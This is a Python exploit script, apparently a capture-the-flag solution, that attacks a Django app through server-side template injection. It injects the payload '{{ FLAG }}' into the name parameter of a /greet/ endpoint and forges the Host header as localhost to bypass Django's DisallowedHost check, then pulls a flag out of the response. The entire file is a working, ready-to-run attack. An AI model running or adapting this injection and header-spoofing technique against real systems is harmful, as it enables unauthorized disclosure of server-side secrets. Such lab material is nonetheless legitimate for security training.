#!/usr/bin/env python3
import sys
import re
import requests
from urllib.parse import quote

"""
X-009-24 exploit (Django SSTI)
Usage:
  pip install requests
  python3 exp.py [BASE_URL]

Default BASE_URL: http://ip32774
This exploit sets Host: localhost to bypass Django DisallowedHost.
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32774"

def extract_flag(html: str):
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    m = re.search(r'<h1>\s*Hello,\s*(.*?)\s*</h1>', html, re.I | re.S)
    if m:
        return m.group(1).strip()
    return None

headers = {
    # Bypass DisallowedHost by sending a permitted host for Django runserver
    "Host": "localhost",
    "User-Agent": "Mozilla/5.0 (X-009-24-EXP)",
}

payload = '{{ FLAG }}'
url = f"{BASE}/greet/?name={quote(payload, safe='{} ')}"

try:
    resp = requests.get(url, headers=headers, timeout=20)
except Exception as e:
    print(f"[!] Request failed: {e}")
    sys.exit(2)

print(f"[.] HTTP {resp.status_code} -> {url}")
flag = extract_flag(resp.text)
if flag:
    print(f"[+] Flag: {flag}")
    sys.exit(0)

print("[!] Flag not found. Response snippet:\n")
print(resp.text[:1200])
sys.exit(2)

